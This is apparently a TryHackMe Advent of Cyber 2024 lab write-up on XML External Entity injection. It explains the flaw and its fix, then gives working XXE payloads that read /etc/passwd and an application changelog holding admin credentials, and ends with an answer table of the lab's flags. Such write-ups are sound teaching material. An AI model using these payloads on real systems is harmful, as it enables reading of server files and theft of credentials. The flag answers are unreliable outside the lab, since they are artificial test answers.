# Advent of Cyber 2024 - Day 5: XXE

{% embed url="https://tryhackme.com/room/adventofcyber2024" %}

SOC-mas XX-what-ee? — XML External Entity injection lets us read arbitrary server files by abusing insecure XML parsers.

## Background

XML External Entity (XXE) injection is a class of vulnerability that affects applications parsing XML input. When an XML parser is configured to process external entity references (defined in a Document Type Definition, or DTD), an attacker can define an entity that points to a local file or a remote URL. The server dutifully fetches and inlines the referenced content into the XML response — handing the attacker the contents of sensitive files.

XXE vulnerabilities exist wherever user-controlled XML is parsed: file upload features, API endpoints that accept `Content-Type: application/xml`, SOAP services, and anywhere XML-based import/export features exist. The fix is simple — disable external entity resolution in the parser — but many legacy configurations still leave it enabled.

The classic payload uses a `DOCTYPE` declaration to define an entity referencing `file:///etc/passwd` or other sensitive paths. When the XML is processed, the entity gets replaced with the file contents, which then appears in the server's response. From there, we pivot to higher-value targets like config files, SSH keys, or application secrets.

## Walkthrough

**Step 1 — Identify the XML-processing endpoint**

Browse the web application and locate a feature that accepts XML — typically a wishlist, product import, or file upload form. Intercept the request in Burp Suite.

**Step 2 — Intercept and inspect the request**

Enable Burp Proxy intercept, trigger the XML submission, and capture the raw request. Confirm the `Content-Type` is `application/xml` or that the body contains XML.

**Step 3 — Inject the XXE payload**

Modify the XML body to include a malicious DTD entity definition:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<wishlist><item>&xxe;</item></wishlist>
```

Forward the modified request and observe the response — the server should return the contents of `/etc/passwd`.

**Step 4 — Pivot to higher-value files**

Now that we've confirmed XXE works, read a more interesting file. Try the application's changelog or a credentials file:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///var/www/html/CHANGELOG">
]>
<wishlist><item>&xxe;</item></wishlist>
```

The response contains the admin credentials:

```
Password: R3c0v3r_s3cr3ts!
```

**Step 5 — Retrieve the secret UUID**

Continue reading application-specific files to extract the secret UUID:

```
7d96660a-02e1-4112-9515-1762d0cb66b7
```

## 🏁 Questions & Answers

| Question | Answer |
|---|---|
| What is the admin password found via XXE? | `R3c0v3r_s3cr3ts!` |
| What is the secret UUID? | `7d96660a-02e1-4112-9515-1762d0cb66b7` |
